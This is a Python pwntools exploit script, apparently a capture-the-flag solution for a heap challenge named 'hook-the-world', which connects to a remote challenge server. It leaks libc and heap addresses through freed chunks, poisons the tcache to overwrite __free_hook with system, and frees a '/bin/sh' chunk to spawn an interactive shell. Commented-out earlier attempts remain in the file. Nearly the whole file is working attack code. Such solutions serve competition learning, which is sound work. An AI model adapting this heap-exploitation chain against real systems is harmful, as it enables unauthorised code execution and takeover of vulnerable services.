from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("hook-the-world.chals.nitectf2024.live", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(ind, size):
    sla(">", "1")
    sla("Chest number:", str(ind))
    sla("Chest size:", str(size))

def free(ind):
    sla(">", "2")
    sla("Idiot crew memebr #:", str(ind))

def edit(ind, data):
    sla(">", "3")
    sla("Chest nunmber:", str(ind))
    sl(data)

def view(ind):
    sla(">", "4")
    sla("Chest no:", str(ind))

# alloc(0, 0xf0)
# alloc(1, 0x70)
# alloc(2, 0xf0)
# alloc(3, 0x30)

# free(0)
# free(1)

# alloc(1, 0x78)

# free(2)

# alloc(0, 0xf0)

# view(0)

for i in range(10):
    alloc(i, 0xf0)

for i in range(8, 0, -1):
    free(i)

view(1)

libc.address = uu64(6) - 0x3ebca0

view(2)

heap = uu64(6)

ic(hex(libc.address))
ic(hex(heap))

alloc(1, 128)
alloc(2, 128)
alloc(3, 128)

edit(2, b'aaaa')
edit(3, b'bbbb')
free(2)
free(3)
edit(3, p64(libc.sym['__free_hook']-11))
alloc(2, 128)
alloc(3, 128)
edit(3, b'aaa' + b'b'*8 +p64(libc.sym['system']))
edit(2, b'/bin/sh\x00')
free(2)
# free(13)
# free(14)
# edit()

# for i in range(10):
#     alloc(i+1, 0x10)

# alloc(11, 24)
# alloc(12, 24)
# alloc(13, 24)
# alloc(14, 24)

# for i in range(9, 0, -1):
#     free(i+1)

# for i in range(9):
#     alloc(i+1, 0x10)

# for i in range(8, 0, -1):
#     free(i+1)



# free(13)
# free(11)
# free(12)
# free(11)

# alloc(0, 128)
# alloc(1, 128)
# free(0)
# free(1)

# alloc(0, 128)
# alloc(1, 128)

io.interactive()
